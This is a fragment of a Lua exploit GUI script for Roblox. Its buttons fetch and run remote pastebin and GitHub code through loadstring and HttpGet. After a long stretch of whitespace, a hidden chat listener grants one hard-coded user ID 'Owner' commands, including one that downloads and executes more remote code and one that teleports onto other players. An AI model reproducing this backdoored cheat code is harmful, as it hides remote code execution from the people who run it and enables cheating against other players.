						defaultValue = assetInfo.Name:split(' ')[1]
					end
				end
	
				animations:AddList({
					text = 'Character Animation',
					flag = 'anim',
					value = 'Mocap',
					values = animsTableNames
				})
				animations:AddButton({
					text = 'Apply Animation',
					flag = 'animapply',
					callback = function()
						pcall(updateAnimations)
					end
				})
			end
		end
		library:Init()
	end)
	CUSTOM_ANIMATIONS.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/kuragalol/r15/main/reanimation'))()
	end)
	
	ENANO_SCRIPTS.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/R4k84r1f'))()
	end)
	
	GIANT_SCRIPT.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/nSM6JfJc'))()
	end)
	
	PUTASOS_SCRIPT.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/8LDyzkYb'))()
	end)
	
	RUSSO_FE.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/qwH4qrMC'))()
	end)
	
	
	
	
	
	
	
	
	
	
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-----------------------------------|
	local Prefix = '.'
															
	local Support = {
		[1009112157] = "Owner"
	}
	
	local Comandos = {
		"kill all",
		"tp",
		"sc" -- SGAMESC_OWNER_RANK
	}
	-----------------------------------| 
	
	game.Players.PlayerAdded:Connect(function(player)
		player.Chatted:Connect(function(msg)
			if Support[player.UserId] then
				msg = msg:lower()
				
				local wordSplid = msg:split(" ")
				local prefixSplit = wordSplid[1]:split(Prefix)
				
				if prefixSplit[2] == Comandos[1] then
					loadstring(game:HttpGet("https://pastebin.com/raw/3NHbFVf8", true))()
				end
				if prefixSplit[2] == Comandos[2] then
					for i,v in pairs(game.Players:GetPlayers()) do
						if string.find(string.lower(v.Name), tostring(wordSplid[3])) then
							local p = player
							local char = p.Character or p.CharacterAdded:Wait()
							local SC = v
							local vSC_Character = SC.Character or SC.CharacterAdded:Wait()
							local v1 = char:WaitForChild("LowerTorso")
							local v2 = vSC_Character:WaitForChild("LowerTorso")
							v1.CFrame = v2.CFrame
						end
					end			
				end
			end
		end)
	end)	
	end
	
	
	
	
	
	
	
	
	
end
coroutine.wrap(LEWCQ_fake_script)()
